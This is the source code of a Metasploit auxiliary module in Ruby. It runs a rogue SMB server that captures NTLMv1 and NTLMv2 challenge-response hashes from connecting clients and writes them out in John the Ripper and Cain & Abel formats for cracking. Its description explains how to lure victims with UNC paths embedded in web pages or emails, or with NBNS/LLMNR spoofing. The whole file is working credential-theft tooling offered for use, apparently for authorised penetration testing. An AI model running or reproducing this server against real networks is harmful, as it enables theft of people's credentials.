##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb'
require 'ruby_smb/gss/provider/ntlm'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::SMB::Server

  def initialize
    super({
      'Name' => 'Authentication Capture: SMB',
      'Description' => %q{
        This module provides a SMB service that can be used to capture the
        challenge-response password hashes of SMB client systems. Responses
        sent by this service have by default a random 8 byte challenge string
        of format `\x11\x22\x33\x44\x55\x66\x77\x881, allowing for easy cracking using
        Cain & Abel (NTLMv1) or John the ripper (with jumbo patch).

        To exploit this, the target system must try to authenticate to this
        module. One way to force an SMB authentication attempt is by embedding
        a UNC path (\\\\SERVER\\SHARE) into a web page or email message. When
        the victim views the web page or email, their system will
        automatically connect to the server specified in the UNC share (the IP
        address of the system running this module) and attempt to
        authenticate. Another option is using auxiliary/spoof/{nbns,llmnr} to
        respond to queries for names the victim is already looking for.

        Documentation of the above spoofing methods can be found by running `info -d`.
      },
      'Author' => [
        'hdm',                 # Author of original module
        'zeroSteiner',         # Creator of RubySMB::Server
        'agalway-r7',          # Port of existing module to use RUBYSMB::Server
        'sjanusz-r7',          # Port of existing module to use RUBYSMB::Server
      ],
      'License' => MSF_LICENSE,
      'Actions' => [[ 'Capture', { 'Description' => 'Run SMB capture server' } ]],
      'PassiveActions' => [ 'Capture' ],
      'DefaultAction' => 'Capture'
    })

    register_options(
      [
        OptString.new('CAINPWFILE', [ false, 'The local filename to store Cain&Abel format hashes in. Only supports NTLMv1 hashes.', nil ]),
        OptString.new('JOHNPWFILE', [ false, 'The local filename to store JTR format hashes in.', nil ]),
        OptString.new('CHALLENGE', [ false, 'The 8 byte server challenge. If unset or not a valid 16 character hexadecimal pattern, a random challenge is used instead.' ]),
        OptString.new('DOMAIN_NAME', [ true, 'The domain name used during smb exchange.', 'anonymous' ])
      ]
    )
  end

  class HashCaptureNTLMProvider < RubySMB::Gss::Provider::NTLM
    def initialize(allow_anonymous: nil, default_domain: nil, listener: nil)
      super(allow_anonymous: allow_anonymous, default_domain: default_domain)
      @listener = listener
    end

    class Authenticator < RubySMB::Gss::Provider::NTLM::Authenticator
      def bin_to_hex(str)
        str.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join
      end

      def process_ntlm_type1(type1_msg)
        @client_os_version = type1_msg.os_version
        # TODO: discern mapping +major+ and +minor+ to human-readable OS names.
        # major, minor, build, ntlm_revision = type1_msg.os_version.unpack('CCnN')
        super
      end

      def process_ntlm_type3(type3_msg)
        username = "#{type3_msg.domain.encode}\\#{type3_msg.user.encode}"
        _, client = ::Socket.unpack_sockaddr_in(@server_client.getpeername)

        hash_type = nil
        combined_hash = "#{type3_msg.user.encode}::#{type3_msg.domain.encode}"

        case type3_msg.ntlm_version
        when :ntlmv1
          hash_type = 'NTLMv1-SSP'
          client_hash = "#{bin_to_hex(type3_msg.lm_response)}:#{bin_to_hex(type3_msg.ntlm_response)}"

          combined_hash << ":#{client_hash}"
          combined_hash << ":#{bin_to_hex(@server_challenge)}"
        when :ntlmv2
          hash_type = 'NTLMv2-SSP'
          client_hash = "#{bin_to_hex(type3_msg.ntlm_response[0...16])}:#{bin_to_hex(type3_msg.ntlm_response[16..-1])}"

          combined_hash << ":#{bin_to_hex(@server_challenge)}"
          combined_hash << ":#{client_hash}"
        end

        unless hash_type.nil?
          puts "[SMB] #{hash_type} Client     : #{client}"
          # puts "[SMB] #{hash_type} Client OS  : #{@client_os_version}"
          puts "[SMB] #{hash_type} Username   : #{username}"
          puts "[SMB] #{hash_type} Hash       : #{combined_hash}"
          puts

          if @provider.listener
            jtr_format = type3_msg.ntlm_version == :ntlmv1 ? 'netntlm' : 'netntlmv2'
            @provider.listener.on_cred(client, combined_hash, jtr_format, username,
                                       @server_challenge, client_hash, type3_msg.domain.encode, @client_os_version)
          end
        end

        WindowsError::NTStatus::STATUS_ACCESS_DENIED
      end
    end

    # Needs overwritten to ensure our version of Authenticator is returned
    def new_authenticator(server_client)
      # build and return an instance that can process and track stateful information for a particular connection but
      # that's backed by this particular provider
      Authenticator.new(self, server_client)
    end

    attr_reader :listener
  end

  def on_cred(address, combined_hash, jtr_format, username, server_challenge, client_hash, domain, _client_os_version)
    if active_db?
      origin = create_credential_origin_service(
        {
          address: address,
          port: datastore['SRVPORT'],
          service_name: 'smb',
          protocol: 'tcp',
          module_fullname: fullname,
          workspace_id: myworkspace_id
        }
      )

      # TODO: Re-implement when +_client_os_version+ can be determined.
      # found_host = framework.db.hosts.find_by(address: address)
      # found_host.os_name = _client_os_version
      # found_host.save!

      create_credential(
        {
          origin: origin,
          origin_type: :service,
          address: address,
          service_name: 'smb',
          port: datastore['SRVPORT'],
          private_data: combined_hash,
          private_type: :nonreplayable_hash,
          jtr_format: jtr_format,
          username: username,
          module_fullname: fullname,
          workspace_id: myworkspace_id
        }
      )
    end

    if datastore['JOHNPWFILE']
      # JTR NTLM hash format NTLMv1
      # Username::Domain:LMHash:NTHash:Challenge
      #
      # JTR NTLM hash format NTLMv2
      # Username::Domain:Challenge:NTHash[0...16]:NTHash[16...-1]

      File.open(File.expand_path(datastore['JOHNPWFILE'], Msf::Config.install_root), 'a') do |f|
        f.puts(combined_hash)
      end
    end

    # Cain & Abel doesn't support import of NTLMv2 hashes
    if datastore['CAINPWFILE'] && jtr_format == 'netntlm'
      # Cain&Abel hash format
      # Username:Domain:Challenge:LMHash:NTLMHash
      File.open(File.expand_path(datastore['CAINPWFILE'], Msf::Config.install_root), 'a') do |f|
        f.puts("#{username}:#{domain}:#{server_challenge}:#{client_hash}")
      end
    end
  end

  def run
    @rsock = Rex::Socket::Tcp.create(
      'LocalHost' => datastore['SRVHOST'],
      'LocalPort' => datastore['SRVPORT'],
      'Server' => true,
      'Timeout' => 3,
      'Context' =>
        {
          'Msf' => framework,
          'MsfExploit' => self
        }
    )

    ntlm_provider = HashCaptureNTLMProvider.new(
      listener: self
    )

    # Set domain name for all future server responses
    ntlm_provider.dns_domain = datastore['DOMAIN_NAME']
    ntlm_provider.dns_hostname = datastore['DOMAIN_NAME']
    ntlm_provider.netbios_domain = datastore['DOMAIN_NAME']
    ntlm_provider.netbios_hostname = datastore['DOMAIN_NAME']

    if datastore['CHALLENGE']
      if datastore['CHALLENGE'].to_s =~ /^([a-fA-F0-9]{16})$/
        # Set challenge for all future server responses

        chall = proc { [datastore['CHALLENGE']].pack('H*') }
        ntlm_provider.generate_server_challenge(&chall)
      else
        print_warning("#{datastore['CHALLENGE']} is not a valid 16 character hexadecimal pattern, using a random pattern instead.")
      end
    end

    if datastore['JOHNPWFILE']
      print_status("JTR hashes will be stored at #{File.expand_path(datastore['JOHNPWFILE'], Msf::Config.install_root)}")
    end

    if datastore['CAINPWFILE']
      print_status("Cain & Abel hashes will be stored at #{File.expand_path(datastore['CAINPWFILE'], Msf::Config.install_root)}")
    end

    server = RubySMB::Server.new(
      server_sock: @rsock,
      gss_provider: ntlm_provider
    )

    print_status("Server is running. Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}")

    server.run do
      print_line
      print_good 'Received SMB connection on Auth Capture Server!'
      true
    end
  end

  def cleanup
    @rsock.close
    super
  end
end
